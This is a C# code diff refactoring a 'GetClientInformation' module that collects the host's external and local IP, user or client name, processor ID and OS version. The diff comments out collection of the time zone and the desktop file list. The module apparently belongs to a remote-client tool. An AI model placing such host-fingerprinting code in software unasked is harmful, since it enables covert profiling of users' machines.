@@ -27,17 +27,17 @@ namespace Caronte.Modules.Information.GetClientInformation
         {
             return new CommomResponse<ClientModel>(new ClientModel()
             {
-                CurrentTimeZoneInfo = GetCurrentTimeZoneInfo(),
-                DesktopFiles = await GetClientDesktopFiles(),
+               //CurrentTimeZoneInfo = GetCurrentTimeZoneInfo(),
+               //DesktopFiles = await GetClientDesktopFiles(),
                 ExternalIp = await GetExternalIp(),
                 LocalIp = await GetLocalIp(),
-                Username = await GetUsername(),
+                ClientName = await GetClientName(),
                 ProcessorIdentifier = GetProcessorIdentifer(),
-                OSVersion = GetOSVersion()
+                Osversion = GetOSVersion()
             });
         }
 
-        private async Task<string> GetUsername()
+        private async Task<string> GetClientName()
         {
             string userName = "";
 
@@ -53,8 +53,8 @@ namespace Caronte.Modules.Information.GetClientInformation
             return userName;
         }
 
-        private TimeZoneInfo GetCurrentTimeZoneInfo() =>
-            TimeZoneInfo.Local;
+        private string GetCurrentTimeZoneInfo() =>
+            TimeZoneInfo.Local.ToString();
 
         private async Task<string> GetLocalIp()
         {
@@ -75,13 +75,13 @@ namespace Caronte.Modules.Information.GetClientInformation
             return ip;
         }
 
-        private async Task<IPAddress> GetExternalIp()
+        private async Task<string> GetExternalIp()
         {
-            IPAddress ipAddress = null;
+            string ipAddress = string.Empty;
 
             try
             {
-                return IPAddress.Parse(await new WebClient().DownloadStringTaskAsync("http://icanhazip.com"));
+                ipAddress = IPAddress.Parse((await new WebClient().DownloadStringTaskAsync("http://icanhazip.com")).Replace("\n", "").Replace("\"", "")).ToString();
             }
             catch (Exception ex)
             {
@@ -123,7 +123,7 @@ namespace Caronte.Modules.Information.GetClientInformation
 
         private string GetOSVersion()
         {
-            return System.Environment.OSVersion.VersionString;
+            return Environment.OSVersion.VersionString;
         }
     }
 }
